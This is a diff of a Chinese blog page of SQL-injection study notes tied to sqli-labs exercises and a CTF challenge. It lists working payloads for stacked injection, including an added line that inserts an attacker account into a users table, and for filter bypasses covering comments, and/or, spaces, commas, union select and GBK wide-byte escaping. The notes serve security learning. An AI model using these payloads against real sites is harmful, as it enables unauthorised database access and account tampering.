@@ -107,6 +107,7 @@
 <h3 id="7-堆叠注入"><a href="#7-堆叠注入" class="headerlink" title="7.堆叠注入"></a>7.堆叠注入</h3><p>主站ez_sql 过滤了select和.<br><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">?inject&#x3D;1’;show</a> databases;#</p>
 <p>?inject&#x3D;1;show tables;#</p>
 <p>?inject&#x3D;1;show columns from `1919810931114514&#96;;# 反单引号括住</p>
+<p>?id&#x3D;1’;insert into users(id,username,password) values (‘38’,’less38’,’hello’)–+<br>#向数据表插入自己的账户密码</p>
 <p>查数据的时候由于不能用select</p>
 <p>方法一：MySQL中查询语句handler：</p>
 <ol>
@@ -138,16 +139,16 @@
 <p>改完之后输入?inject&#x3D;1’ or 1&#x3D;1; 显示flag</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;590b74d2-2d4d-41f7-bb0e-137622e5043b&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="四-常见绕过"><a href="#四-常见绕过" class="headerlink" title="四.常见绕过"></a>四.常见绕过</h2><h3 id="1-过滤注释符绕过"><a href="#1-过滤注释符绕过" class="headerlink" title="1.过滤注释符绕过"></a>1.过滤注释符绕过</h3><p>(1)#	–+	%23</p>
+<h2 id="四-常见绕过"><a href="#四-常见绕过" class="headerlink" title="四.常见绕过"></a>四.常见绕过</h2><h3 id="1-过滤注释符绕过"><a href="#1-过滤注释符绕过" class="headerlink" title="1.过滤注释符绕过"></a>1.过滤注释符绕过</h3><p>(1)#	–+	%23 less23</p>
 <p>(2)手动闭合<br>select * from users WHERE id&#x3D;’1’ and  1&#x3D;1’’ LIMIT 0,1<br><code>1&#39; and  1=1&#39;</code>闭合了后面的引号<br><code>?id=1&#39;)(&#39;</code> -&gt;不能正常显示<br><code>?id=1&#39;) or (&#39;1&#39;)(&#39;</code> -&gt;因为1的存在正常显示<br><code>?id=1&#39; order by 3 or &#39;1&#39;=&#39;1</code></p>
-<h3 id="2-and-or绕过"><a href="#2-and-or绕过" class="headerlink" title="2.and&#x2F;or绕过"></a>2.and&#x2F;or绕过</h3><p>(1)大小写绕过 anD<br>(2)复写过滤字段  anandd<br>(3)&amp;&amp;，||	需要url编码</p>
+<h3 id="2-and-or绕过-less25"><a href="#2-and-or绕过-less25" class="headerlink" title="2.and&#x2F;or绕过 less25"></a>2.and&#x2F;or绕过 less25</h3><p>(1)大小写绕过 anD<br>(2)复写过滤字段  anandd<br>(3)&amp;&amp;，||	需要url编码</p>
 <p>注意information里也有or</p>
-<h3 id="3-空格绕过"><a href="#3-空格绕过" class="headerlink" title="3.空格绕过"></a>3.空格绕过</h3><p>(1)”+”绕过<br>(2)%20 %0A %A0 %0C<br>(3)&#x2F;**&#x2F;<br>(4)报错注入无空格 -&gt;<code>?id=1&#39;||extractvalue(1,concat(&#39;$&#39;,(database())))||&#39;1&#39;=&#39;1</code></p>
+<h3 id="3-空格绕过less27"><a href="#3-空格绕过less27" class="headerlink" title="3.空格绕过less27"></a>3.空格绕过less27</h3><p>(1)”+”绕过<br>(2)%20 %0A %A0 %0C<br>(3)&#x2F;**&#x2F;<br>(4)报错注入无空格 -&gt;<code>?id=1&#39;||extractvalue(1,concat(&#39;$&#39;,(database())))||&#39;1&#39;=&#39;1</code></p>
 <h3 id="4-逗号过滤"><a href="#4-逗号过滤" class="headerlink" title="4.逗号过滤"></a>4.逗号过滤</h3><p>join  …  on …</p>
 <p>select u.<em>e.</em> from users u(起别名) join emails e on u.id&#x3D;e.id;<br>等价于select u.<em>,e.</em> from users u(起别名) , emails e where u.id&#x3D;e.id;</p>
 <p>在判断完列数之后，union select * from (select 1)a JOIN (select 2)b JOIN (select 3)c;<br>效果与union select * from 1,2,3相同</p>
-<h3 id="5-union-select绕过"><a href="#5-union-select绕过" class="headerlink" title="5.union select绕过"></a>5.union select绕过</h3><p>(1)大小写绕过<br>(2)复写绕过<br>(3)中间加&#x2F;**&#x2F;<br>(4)采用其他方法</p>
-<h3 id="6-宽字节绕过"><a href="#6-宽字节绕过" class="headerlink" title="6.宽字节绕过"></a>6.宽字节绕过</h3><p>addslashes()函数让我们的引号失去作用</p>
+<h3 id="5-union-select绕过less27"><a href="#5-union-select绕过less27" class="headerlink" title="5.union select绕过less27"></a>5.union select绕过less27</h3><p>(1)大小写绕过<br>(2)复写绕过<br>(3)中间加&#x2F;**&#x2F;<br>(4)采用其他方法</p>
+<h3 id="6-宽字节绕过less32"><a href="#6-宽字节绕过less32" class="headerlink" title="6.宽字节绕过less32"></a>6.宽字节绕过less32</h3><p>addslashes()函数让我们的引号失去作用</p>
 <p>要求：数据库GBK编码<br>我们写入%df能够和(%5c)组成一个gbk编码（%df%5c），对应一个汉字</p>
 <p><img src="/../images/sql%E6%B3%A8%E5%85%A5/8.png"></p>
 <p>数据库会忽略掉这个汉字，从而注入</p>
